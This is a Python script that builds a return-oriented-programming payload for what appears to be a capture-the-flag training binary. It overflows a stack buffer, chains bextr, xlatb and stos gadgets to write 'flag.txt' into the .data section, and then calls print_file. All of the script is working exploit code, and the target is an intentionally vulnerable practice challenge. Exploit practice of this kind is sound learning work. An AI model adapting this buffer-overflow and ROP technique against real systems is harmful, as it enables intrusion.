#!/usr/bin/env python

import struct
import sys

padding_len = 32 #until just before rbp is overwritten

leetcoff = struct.pack("L", 0x13371337c000ffee)

print_file = struct.pack("L", 0x400510)

# 0x40062a pop rdx
# 0x40062b pop rcx
# 0x40062c add rcx, 0x3ef2
# 0x400633 bextr rbx, rcx, rdx
# 0x400638 ret
bextr_gad = struct.pack("L", 0x40062a)

# sets al to byte at [rbx+al] 
xlatb = struct.pack("L", 0x400628) # xlat BYTE PTR ds:[rbx]; ret

# stores content of al to [rdi]
stos = struct.pack("L", 0x400639) #stos BYTE PTR es:[rdi], al

pop_rdi = struct.pack("L", 0x4006a3) # pop rdi; ret

def copy_byte(destination: int, source: int):
    result = b""
    result += bextr_gad                       # |
    result += struct.pack("L", 0x4000)        # |
    result += struct.pack("l", source-0x3ef2) # source ptr -> rbx
    result += xlatb # byte from source -> al
    result += pop_rdi
    result += struct.pack("L", destination)
    result += stos # store al content to [rdi]

    return result

filename_loc_raw = 0x601028 #.data
filename = b"flag.txt"

payload = b'A'*padding_len
payload += leetcoff # rbp overwrite

# this *could* be automated even further but I'm satisfied in this case
# source subtracts are here to compensate the annoying +al in [rdi+al]
payload += copy_byte(filename_loc_raw,   0x4003c4-ord('\x0b')) # f 
payload += copy_byte(filename_loc_raw+1, 0x400239-ord('f')) # l
payload += copy_byte(filename_loc_raw+2, 0x4003d6-ord('l')) # a
payload += copy_byte(filename_loc_raw+3, 0x4003cf-ord('a')) # g
payload += copy_byte(filename_loc_raw+4, 0x40024e-ord('g')) # .
payload += copy_byte(filename_loc_raw+5, 0x400192-ord('.')) # t
payload += copy_byte(filename_loc_raw+6, 0x400246-ord('t')) # x
payload += copy_byte(filename_loc_raw+7, 0x400192-ord('x')) # t

payload += pop_rdi
payload += struct.pack("L", filename_loc_raw)
payload += print_file

sys.stdout.buffer.write(payload)
